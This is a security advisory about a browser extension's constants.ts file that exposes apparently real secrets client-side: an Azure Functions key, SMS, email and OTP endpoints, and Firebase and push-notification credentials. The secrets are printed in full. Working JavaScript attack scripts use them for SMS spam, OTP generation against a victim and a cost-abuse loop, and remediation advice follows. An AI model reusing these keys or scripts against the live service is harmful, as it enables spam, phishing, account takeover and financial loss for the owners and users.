# 🚨 CRITICAL: Exposed Constants & API Keys Vulnerability

## Executive Summary

The `constants.ts` file contains **sensitive API keys, endpoints, and configuration** that are **exposed client-side** in the browser. This is a **CRITICAL security vulnerability** that allows:

1. **Unauthorized API Access** - Attackers can use exposed keys to make API calls
2. **Service Abuse** - SMS, Email, and OTP services can be abused
3. **Firebase Access** - Firebase services can be accessed with exposed credentials
4. **Cost Exploitation** - Attackers can rack up costs on cloud services
5. **Data Exfiltration** - Potential access to user data through exposed endpoints

## Exposed Secrets

### 1. Gateway Function Key (CRITICAL)
```typescript
gatewayFunctionKey = "23o7dHkKdIMtjnft5q/J4mqpdBqqOOuajepmYqY0eAi9TaqQYsVSBA=="
```

**Impact:**
- This is an Azure Functions **master key** or **function key**
- Can be used to authenticate requests to **all Azure Functions** in the app
- Allows bypassing authentication on backend services
- Can be used to make unlimited API calls

**Exploitation:**
```javascript
// Any attacker can use this key
fetch('https://verified.azurewebsites.net/api/smssender', {
    headers: {
        'x-functions-key': '23o7dHkKdIMtjnft5q/J4mqpdBqqOOuajepmYqY0eAi9TaqQYsVSBA=='
    },
    body: JSON.stringify({ phoneNumber: '+1234567890', message: 'Spam' })
});
```

### 2. API Endpoints (HIGH)

#### SMS Sender Endpoint
```typescript
smsSenderUrl = "https://verified.azurewebsites.net/api/smssender"
```

**Impact:**
- Allows sending SMS messages to any phone number
- Can be used for spam, phishing, or harassment
- Can rack up significant costs
- May violate SMS service terms

#### Email Sender Endpoint
```typescript
emailSenderUrl = "https://verified.azurewebsites.net/api/emailsender"
```

**Impact:**
- Allows sending emails from the service
- Can be used for spam or phishing campaigns
- May damage sender reputation
- Can result in service blacklisting

#### OTP Sender Endpoint
```typescript
verifiedOtpEndpoint = "https://verified.azurewebsites.net/api/otpsender"
```

**Impact:**
- Can generate OTPs for any user
- May allow account takeover if OTP validation is weak
- Can be used to bypass 2FA
- Enables social engineering attacks

#### Passkey Endpoint
```typescript
getPasskeyEndpoint = "https://wallet.verified.network/get-passkey"
```

**Impact:**
- May allow unauthorized passkey retrieval
- Could enable account access
- May expose user authentication data

### 3. Firebase Configuration (HIGH)

```typescript
firebaseConfig = {
    apiKey: "AIzaSyC9NftjURlBho082sU7jzkLfI25ChqOUrk",
    authDomain: "verified-custody.firebaseapp.com",
    projectId: "verified-custody",
    storageBucket: "verified-custody.firebasestorage.app",
    messagingSenderId: "575278027010",
    appId: "1:575278027010:web:efde7726d858a8b9ff721b",
    measurementId: "G-ZXVZTFJ5PN"
}
```

**Impact:**
- Firebase API keys are exposed (though they have domain restrictions)
- Project ID and configuration exposed
- Can be used to:
  - Access Firebase Realtime Database (if rules allow)
  - Access Firebase Storage (if rules allow)
  - Attempt Firebase Auth operations
  - Access Firebase Analytics data

**Firebase Security:**
- Firebase API keys are **public by design** but should have domain restrictions
- However, exposed keys can still be used for:
  - Enumeration attacks
  - Rate limiting bypass attempts
  - Service abuse

### 4. Firebase VAPID Key (MEDIUM)

```typescript
firebaseVapid = "BNkRzfJrlIYAtG5sKnpmi3uqEP3mJBKA_CGGk8tzkDbOF--n4-TpMO4n4m_X229yEfa8CLtCZ5oT65whfbcCNfc"
```

**Impact:**
- VAPID keys are used for Web Push notifications
- Exposed key can be used to:
  - Send push notifications to users
  - Spam users with notifications
  - Potentially access notification data

### 5. WalletConnect Project ID (MEDIUM)

```typescript
projectId = "90b0e2ff886ba98147f2780659cf12a6"
```

**Impact:**
- WalletConnect project identifier exposed
- Can be used for:
  - Service enumeration
  - Potential service abuse
  - Connection manipulation attempts

## Attack Vectors

### 1. Direct API Exploitation

**Scenario:** Attacker uses exposed gateway function key to call APIs directly

```javascript
// SMS Spam Attack
async function spamSMS(phoneNumbers) {
    for (const phone of phoneNumbers) {
        await fetch('https://verified.azurewebsites.net/api/smssender', {
            method: 'POST',
            headers: {
                'x-functions-key': '23o7dHkKdIMtjnft5q/J4mqpdBqqOOuajepmYqY0eAi9TaqQYsVSBA==',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                phoneNumber: phone,
                message: 'Phishing message here'
            })
        });
    }
}
```

**Impact:**
- Unlimited SMS sending
- Cost exploitation
- Spam/phishing campaigns
- Service abuse

### 2. OTP Bypass Attack

**Scenario:** Attacker generates OTPs for victim accounts

```javascript
// OTP Generation Attack
async function generateOTP(victimEmail) {
    const response = await fetch('https://verified.azurewebsites.net/api/otpsender', {
        method: 'POST',
        headers: {
            'x-functions-key': '23o7dHkKdIMtjnft5q/J4mqpdBqqOOuajepmYqY0eAi9TaqQYsVSBA==',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: victimEmail,
            phoneNumber: '+1234567890'
        })
    });
    // If OTP validation is weak, attacker can use this
}
```

**Impact:**
- Account takeover
- 2FA bypass
- Unauthorized access

### 3. Firebase Service Abuse

**Scenario:** Attacker uses exposed Firebase config to access services

```javascript
// Firebase Database Access Attempt
async function accessFirebase() {
    const response = await fetch(
        `https://verified-custody.firebaseio.com/.json`,
        {
            headers: {
                'Content-Type': 'application/json'
            }
        }
    );
    // If security rules are misconfigured, data may be accessible
}
```

**Impact:**
- Data exfiltration
- Service abuse
- Cost exploitation

### 4. Cost Exploitation

**Scenario:** Attacker uses exposed keys to rack up service costs

```javascript
// Cost Exploitation Attack
async function exploitCosts() {
    // Send thousands of SMS messages
    for (let i = 0; i < 10000; i++) {
        await fetch('https://verified.azurewebsites.net/api/smssender', {
            method: 'POST',
            headers: {
                'x-functions-key': '23o7dHkKdIMtjnft5q/J4mqpdBqqOOuajepmYqY0eAi9TaqQYsVSBA==',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                phoneNumber: '+1234567890',
                message: `Spam message ${i}`
            })
        });
    }
}
```

**Impact:**
- Massive cloud service bills
- Service disruption
- Financial damage

## Proof of Concept

A comprehensive exploit POC is available in `constants-exploit-poc.html` that demonstrates:

1. **Constant Extraction** - Shows how constants are exposed
2. **API Endpoint Testing** - Tests all exposed endpoints
3. **Gateway Key Exploitation** - Tests Azure Functions access
4. **Firebase Access** - Tests Firebase service access
5. **Comprehensive Exploit** - Runs all attack vectors

### Usage

1. Open `constants-exploit-poc.html` in a browser
2. Click test buttons to exploit each endpoint
3. Review results to see which endpoints are vulnerable
4. Check browser console for detailed logs

## Remediation

### Immediate Actions (CRITICAL)

1. **Rotate All Exposed Keys**
   - Generate new Azure Functions keys
   - Rotate Firebase API keys
   - Update VAPID keys
   - Change WalletConnect project if possible

2. **Implement Server-Side Validation**
   - Move all API keys to server-side
   - Never expose keys in client-side code
   - Use environment variables on server
   - Implement proper authentication

3. **Add Rate Limiting**
   - Implement rate limiting on all endpoints
   - Add IP-based throttling
   - Monitor for abuse patterns
   - Set up alerts for unusual activity

4. **Review Security Rules**
   - Check Firebase security rules
   - Verify Azure Functions authentication
   - Review API endpoint access controls
   - Audit all exposed endpoints

### Long-term Solutions

1. **Architecture Changes**
   - Move sensitive operations to server-side
   - Use proxy endpoints for client requests
   - Implement proper API gateway
   - Use service-to-service authentication

2. **Key Management**
   - Use Azure Key Vault or similar
   - Implement key rotation policies
   - Use separate keys for different environments
   - Monitor key usage

3. **Monitoring & Alerting**
   - Set up usage monitoring
   - Alert on unusual patterns
   - Monitor costs
   - Track API call volumes

4. **Security Best Practices**
   - Never commit keys to version control
   - Use environment variables
   - Implement least privilege
   - Regular security audits

## Code Locations

### Exposed File
- **Source**: `constants.ts` (line 1-107)
- **Compiled**: `utils/constants.js` (embedded in bundle)
- **Runtime**: Available in browser DevTools

### Usage Locations
- `scripts/content.js` - Uses constants in content script
- `scripts/background.js` - Uses constants in background script
- `scripts/injected.js` - Uses constants in injected script

## Impact Assessment

### Severity: **CRITICAL**

### Affected Systems
- Azure Functions (SMS, Email, OTP endpoints)
- Firebase Services (Database, Storage, Auth)
- WalletConnect Integration
- Push Notification Service

### Potential Damage
- **Financial**: Unlimited service costs
- **Reputation**: Spam/phishing campaigns
- **Security**: Account takeover, data breach
- **Compliance**: GDPR, CCPA violations

### Exploitability
- **Ease**: Trivial (keys are public)
- **Detection**: Difficult (looks like legitimate traffic)
- **Impact**: Severe (full service access)

## Detection

### How to Check if You're Affected

1. **Check Browser DevTools**
   ```javascript
   // Open browser console on any page with extension
   // Search for "gatewayFunctionKey" in Sources tab
   ```

2. **Check Compiled Code**
   ```bash
   # Search for exposed keys in compiled JavaScript
   grep -r "23o7dHkKdIMtjnft5q" scripts/
   ```

3. **Monitor API Usage**
   - Check Azure Functions usage logs
   - Monitor Firebase usage
   - Review SMS/Email service logs
   - Check for unusual patterns

## Conclusion

This is a **CRITICAL security vulnerability** that requires **immediate action**. All exposed keys should be rotated immediately, and the architecture should be changed to prevent client-side key exposure.

The exposed constants allow attackers to:
- Make unlimited API calls
- Abuse SMS/Email services
- Potentially access user data
- Rack up service costs
- Bypass authentication

**Immediate remediation is required before this vulnerability is exploited in production.**

